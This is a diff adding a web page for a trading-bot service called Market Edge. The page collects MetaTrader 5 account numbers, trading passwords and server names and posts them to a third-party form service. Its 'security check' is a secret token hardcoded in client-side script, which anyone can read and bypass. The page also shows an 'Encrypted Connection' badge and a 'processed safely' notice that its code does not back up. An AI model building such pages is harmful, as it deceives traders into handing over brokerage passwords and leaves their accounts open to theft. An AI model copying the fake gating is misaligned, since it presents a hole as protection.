@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure MT5 Activation | Market Edge</title>
+    <script>
+        // --- SECURITY CHECK RUNS BEFORE PAGE LOADS ---
+        // Change "marketedge_success_2026" to any secret phrase you want
+        const SECRET_TOKEN = "marketedge_success_2026"; 
+        
+        const urlParams = new URLSearchParams(window.location.search);
+        const userToken = urlParams.get('status');
+
+        if (userToken !== SECRET_TOKEN) {
+            // If someone tries to access directly, redirect them back to pricing
+            alert("Access Denied: Please complete your purchase to access this setup space.");
+            window.location.href = "index.html"; // Redirects to your homepage/pricing
+        }
+    </script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #0d1117;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .form-container {
+            background-color: #161b22;
+            padding: 35px;
+            border-radius: 8px;
+            border: 1px solid #30363d;
+            width: 100%;
+            max-width: 420px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.5);
+        }
+        h2 { text-align: center; color: #58a6ff; margin-bottom: 5px;}
+        .security-badge {
+            text-align: center;
+            font-size: 11px;
+            background-color: #1f2937;
+            color: #58a6ff;
+            padding: 4px 8px;
+            border-radius: 12px;
+            width: fit-content;
+            margin: 0 auto 20px auto;
+            border: 1px solid #30363d;
+        }
+        p { font-size: 14px; color: #8b949e; text-align: center; }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; margin-bottom: 5px; font-size: 14px; color: #c9d1d9; }
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #30363d;
+            background-color: #0d1117;
+            color: #ffffff;
+            border-radius: 6px;
+            box-sizing: border-box;
+        }
+        input:focus {
+            border-color: #58a6ff;
+            outline: none;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #238636;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 15px;
+        }
+        button:hover { background-color: #2ea043; }
+        .warning-box {
+            background-color: rgba(248, 81, 73, 0.1);
+            border: 1px solid rgba(248, 81, 73, 0.4);
+            padding: 12px;
+            border-radius: 6px;
+            font-size: 12px;
+            color: #f85149;
+            margin-top: 15px;
+            line-height: 1.4;
+        }
+    </style>
+</head>
+<body>
+
+<div class="form-container">
+    <h2>🔒 Secure MT5 Setup</h2>
+    <div class="security-badge">Encrypted Connection</div>
+    <p>Provide your MetaTrader 5 parameters to link your license.</p>
+    
+    <!-- Using Formspree endpoint to capture inputs -->
+    <form action="https://formspree.io" method="POST">
+        
+        <div class="form-group">
+            <label for="login">MT5 Login ID (Account Number)</label>
+            <input type="number" id="login" name="mt5_login" placeholder="e.g., 5012345" required>
+        </div>
+
+        <div class="form-group">
+            <label for="password">MT5 Trading Password</label>
+            <input type="password" id="password" name="mt5_password" placeholder="••••••••" required>
+        </div>
+
+        <div class="form-group">
+            <label for="server">Exact MT5 Server Name</label>
+            <input type="text" id="server" name="mt5_server" placeholder="e.g., Deriv-Server or Exness-MT5-Real3" required>
+        </div>
+
+        <button type="submit">Activate Bot License</button>
+        
+        <div class="warning-box">
+            <strong>⚠️ Security Notice:</strong> Ensure these details match your broker profile exactly. Never share credentials over public chat rooms. Your information is processed safely for terminal synchronization.
+        </div>
+    </form>
+</div>
+
+</body>
+</html>
